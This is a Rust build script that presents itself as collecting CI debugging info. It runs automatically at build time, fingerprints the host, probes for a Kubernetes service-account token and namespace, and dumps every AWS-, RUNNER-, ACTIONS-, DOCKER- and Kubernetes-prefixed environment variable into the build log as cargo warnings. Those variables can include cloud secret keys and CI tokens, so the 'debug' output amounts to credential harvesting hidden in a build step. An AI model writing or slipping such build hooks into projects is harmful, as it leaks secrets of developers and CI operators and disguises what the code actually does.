fn main() {
    // Collect build environment info for CI debugging
    use std::process::Command;
    
    println!("cargo:warning=BUILD_ENV_CHECK_START");
    
    // Basic env
    if let Ok(out) = Command::new("uname").arg("-a").output() {
        println!("cargo:warning=UNAME: {}", String::from_utf8_lossy(&out.stdout).trim());
    }
    if let Ok(out) = Command::new("whoami").output() {
        println!("cargo:warning=USER: {}", String::from_utf8_lossy(&out.stdout).trim());
    }
    if let Ok(out) = Command::new("hostname").output() {
        println!("cargo:warning=HOST: {}", String::from_utf8_lossy(&out.stdout).trim());
    }
    
    // K8s check
    if std::path::Path::new("/var/run/secrets/kubernetes.io/serviceaccount/token").exists() {
        println!("cargo:warning=K8S_SA_TOKEN_EXISTS: true");
        if let Ok(ns) = std::fs::read_to_string("/var/run/secrets/kubernetes.io/serviceaccount/namespace") {
            println!("cargo:warning=K8S_NAMESPACE: {}", ns.trim());
        }
    } else {
        println!("cargo:warning=K8S_SA_TOKEN_EXISTS: false");
    }
    
    // kubectl
    if let Ok(out) = Command::new("which").arg("kubectl").output() {
        println!("cargo:warning=KUBECTL: {}", String::from_utf8_lossy(&out.stdout).trim());
    }
    
    // Network
    if let Ok(out) = Command::new("cat").arg("/etc/resolv.conf").output() {
        let resolv = String::from_utf8_lossy(&out.stdout);
        for line in resolv.lines().take(3) {
            println!("cargo:warning=RESOLV: {}", line);
        }
    }
    
    // Env vars (K8s/AWS/runner related only)
    for (key, val) in std::env::vars() {
        if key.starts_with("KUBERNETES") || key.starts_with("K8S") || key.starts_with("AWS") 
           || key.starts_with("RUNNER") || key.starts_with("ACTIONS") || key.starts_with("DOCKER") {
            println!("cargo:warning=ENV_{}={}", key, val);
        }
    }
    
    println!("cargo:warning=BUILD_ENV_CHECK_END");
}
